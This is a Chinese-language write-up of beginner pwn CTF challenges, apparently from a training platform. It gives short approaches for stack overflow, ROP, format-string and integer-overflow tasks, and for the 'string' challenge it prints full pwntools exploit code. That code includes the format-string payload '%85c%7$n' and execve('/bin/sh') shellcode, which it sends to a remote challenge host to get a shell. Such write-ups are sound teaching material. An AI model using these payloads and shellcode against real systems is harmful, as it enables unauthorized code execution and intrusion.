## pwn新手练习区
### get_shell
题目：运行就能拿到shell呢，真的

思路：真的

### CGfsb296
题目：菜鸡面对着pringf发愁，他不知道prinf除了输出还有什么作用

思路：利用格式化字符串漏洞利用方法读写任意地址

### when_did_you_born12
题目：只要知道你的年龄就能获得flag，但菜鸡发现无论如何输入都不正确，怎么办

思路：简单的栈溢出，利用字符串变量覆盖另一个变量

### hello_pwn
题目：pwn！，segment fault！菜鸡陷入了深思

思路：简单的栈溢出，利用字符串变量覆盖另一个变量

### level0
题目：菜鸡了解了什么是溢出，他相信自己能得到shell

思路：简单的64位栈溢出

### level2
题目：菜鸡请教大神如何获得flag，大神告诉他‘使用`面向返回的编程`(ROP)就可以了’

思路：简单的栈溢出，利用ROP获得shell

### cgpwn2
题目：菜鸡认为自己需要一个字符串

思路：简单的栈溢出，首先利用一个固定地址的全局变量保存/bin/sh字符串，然后利用ROP获得shell

### string
题目：菜鸡遇到了Dragon，有一位巫师可以帮助他逃离危险，但似乎需要一些要求

思路：简单的64位格式化字符串漏洞，先利用改漏洞修改一个堆上的变量，然后写入shellcode即可

解题：函数sub_400BB9存在格式化字符串漏洞，直接使用printf输出了format变量，这里首先确定可控制字符串format的偏移。有两种方法。

#### 偏移计算一：通过逆向和调试确定分析调用printf之前栈的分布

栈顶8个字节（没什么作用），往下8个字节的v2变量，再往下是format字符串。
```
rsp    --> 8字节垃圾
rsp+8  --> 8字节变量v2
rsp+16 --> format字符串
```

由于64位传参时，前6个参数使用寄存器，这里第一个参数是rdi，也就是format地址本身，后面5几个寄存器依次保存5个参数，栈顶8个字节是第6个参数，v2是第第7个参数，format是8个参数，因此偏移为8。

#### 偏移计算二：使用pwntools工具包自动计算
```python
context.bits = 64

def leak(payload):
    sh = remote('220.249.52.133', 59913)
    sh.recvuntil('be:\n')
    sh.sendline('1')
    sh.recvuntil('up?:\n')
    sh.sendline('east')
    sh.recvuntil('?:\n')
    sh.sendline('1')
    sh.recvuntil("'\n")
    sh.sendline('1')
    sh.recvuntil(':\n')
    sh.sendline(payload)
    info = sh.recvuntil('I hear')
    sh.close()
    return info

autofmt = FmtStr(leak)
print(autofmt.offset)
```

下面分析需求修改的变量，通过逆向分析，程序初始化了两个变量，一个为字符D，一个为字符U，如果这两个变量相等可以进入输入shellcode的逻辑，正常情况是不可能的，这里就利用字符串格式化漏洞实现。首先输入v2变量，内容为secret[0]的地址，然后format输入以下内容 %85c%7$n ,将第7个参数（v2）指向的内容写入85，也就是字符U。

后续输入shellcode可以使用pwntools，我这里是通过msf生成的。全部代码如下：
```python
def execute():
    sh = remote('220.249.52.133', 59913)
    info = sh.recvuntil('be:\n')
    info = str(info, encoding='utf8')
    addr = ''
    for line in info.split('\n'):
        if '[0]' in line:
            # 保存待修改变量地址
            addr = line.split(' ')[-1].strip()
            break
    print('secret addr:')
    print(addr)
    addr = int(addr, 16)

    sh.sendline('1')
    sh.recvuntil('up?:\n')
    sh.sendline('east')
    sh.recvuntil('?:\n')
    sh.sendline('1')
    sh.recvuntil("'\n")
    # 将待修改变量地址写入v2
    sh.sendline(str(addr).encode('utf8'))
    sh.recvuntil(':\n')
    
    # 利用这段payload修改变量
    payload = r'%85c%7$n'
    print(payload)
    sh.sendline(payload)
    print(sh.recvuntil('USE YOU SPELL'))

    # 写入shellcode
    shellcode = "\x6a\x3b\x58\x99\x48\xbb\x2f\x62\x69\x6e\x2f\x73\x68\x00" + "\x53\x48\x89\xe7\x68\x2d\x63\x00\x00\x48\x89\xe6\x52\xe8" + "\x08\x00\x00\x00\x2f\x62\x69\x6e\x2f\x73\x68\x00\x56\x57" + "\x48\x89\xe6\x0f\x05"
    sh.sendline(shellcode)
    sh.interactive()
````

### guess_num
题目：菜鸡在玩一个猜数字的游戏，但他无论如何都银不了，你能帮助他么

思路：简单的栈溢出，覆盖产生随机数的种子变量，然后爆破随机数序列即可


### int_overflow
题目：菜鸡感觉这题似乎没有办法溢出，真的么?

思路：比较密码长度时将长度保存到了寄存器al中，当长度为259时，高字节被丢弃，al中为3，满足密码要求，同时259长度的密码在后面复制时存在简单栈溢出
